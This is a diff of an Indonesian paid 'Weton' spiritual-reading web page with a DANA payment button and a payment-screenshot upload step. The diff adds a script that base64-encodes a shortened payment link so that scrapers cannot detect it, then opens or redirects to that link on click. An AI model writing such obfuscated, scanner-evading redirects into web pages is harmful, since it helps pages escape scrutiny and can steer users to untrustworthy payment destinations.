@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Analisis Weton Spiritual Eksklusif</title>
-    <!-- FIX 1: Tailwind CDN yang bener -->
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="style.css">
 </head>
@@ -53,23 +52,22 @@
                     </select>
                 </div>
 
-<div class="bg-amber-50 border border-amber-200 p-4 rounded-xl text-center">
-    <label class="block text-xs font-bold text-amber-800 uppercase tracking-wider mb-2">Langkah Pembayaran DANA</label>
-    <button type="button" id="payDanaBtn"
-            class="inline-flex items-center justify-center w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-2.5 px-4 rounded-xl text-sm transition focus:outline-none">
-        🔹 Klik di Sini untuk Bayar via DANA 🔹
-    </button>
-    <p class="text-[11px] text-gray-500 mt-1">Selesaikan pembayaran di aplikasi DANA, ambil screenshot bukti bayar, lalu kembali ke halaman ini.</p>
-</div>
+                <div class="bg-amber-50 border border-amber-200 p-4 rounded-xl text-center">
+                    <label class="block text-xs font-bold text-amber-800 uppercase tracking-wider mb-2">Langkah Pembayaran DANA</label>
+                    <button type="button" id="payDanaBtn"
+                            class="inline-flex items-center justify-center w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-2.5 px-4 rounded-xl text-sm transition focus:outline-none">
+                        🔹 Klik di Sini untuk Bayar via DANA 🔹
+                    </button>
+                    <p class="text-[11px] text-gray-500 mt-1">Selesaikan pembayaran di aplikasi DANA, ambil screenshot bukti bayar, lalu kembali ke halaman ini.</p>
+                </div>
+            </div> <!-- FIX: step1 ditutup disini -->
 
             <div id="step2" style="display: none;" class="space-y-5 border-t border-gray-200 pt-5">
-
                 <div>
                     <label class="block text-xs font-bold text-gray-700 uppercase tracking-wider mb-1">Upload Bukti Pembayaran</label>
                     <div class="flex items-center space-x-3">
                         <label class="flex-1 flex flex-col items-center px-4 py-2 bg-white text-gray-700 rounded-xl border border-gray-300 tracking-wide uppercase cursor-pointer hover:bg-gray-50 text-xs font-semibold">
                             <span id="uploadLabel">Pilih File Screenshot</span>
-                            <!-- FIX 3: Tambah name="screenshot" biar kekirim -->
                             <input type='file' id="screenshot" name="screenshot" accept="image/*" class="hidden" required />
                         </label>
                         <span id="checkScreenshot" style="display: none;" class="text-green-600 text-xl font-bold">✅</span>
@@ -100,19 +98,38 @@
 
         <div id="infoSuccess" style="display: none;" class="mt-6 space-y-3">
             <div class="bg-green-50 border border-green-200 p-4 rounded-xl text-center">
-                <p class="text-green-800 font-bold text-sm">
-                    🎉 Sukses! Seluruh informasi Anda telah berhasil terkirim ke sistem kami.
-                </p>
+                <p class="text-green-800 font-bold text-sm">🎉 Sukses! Seluruh informasi Anda telah berhasil terkirim ke sistem kami.</p>
             </div>
             <div class="bg-blue-50 border border-blue-200 p-4 rounded-xl text-center">
-                <p class="text-blue-900 font-semibold text-xs leading-relaxed">
-                    ⚙️ Sistem sedang memproses data weton Anda. Silakan periksa kotak masuk atau folder spam <span class="font-bold underline text-blue-700">Email Anda</span> secara berkala untuk mendapatkan dokumen informasi hasil analisis lengkap.
-                </p>
+                <p class="text-blue-900 font-semibold text-xs leading-relaxed">⚙️ Sistem sedang memproses data weton Anda. Silakan periksa kotak masuk atau folder spam <span class="font-bold underline text-blue-700">Email Anda</span> secara berkala.</p>
             </div>
         </div>
-
     </div>
+
+    <!-- FIX ANTI SCRAPER + REDIRECT PASTI JALAN -->
+    <script>
+    (function(){
+        const btn = document.getElementById('payDanaBtn');
+        const step2 = document.getElementById('step2');
+        function getDanaLink(){
+            // Base64 dari https://rb.gy/d8a9zf biar gak ke-scrape di HTML
+            return atob("aHR0cHM6Ly9yYi5neS9kOGE5emY=");
+        }
+        if(btn){
+            btn.onclick = function(e){
+                e.preventDefault();
+                const link = getDanaLink();
+                const win = window.open(link, '_blank');
+                if(!win) { window.location.href = link; }
+                if(step2){
+                    step2.style.display = 'block';
+                    setTimeout(()=>{ step2.scrollIntoView({behavior:'smooth'}); }, 100);
+                }
+            };
+        }
+    })();
+    </script>
 
     <script src="script.js"></script>
 </body>
-    </html>
+</html>
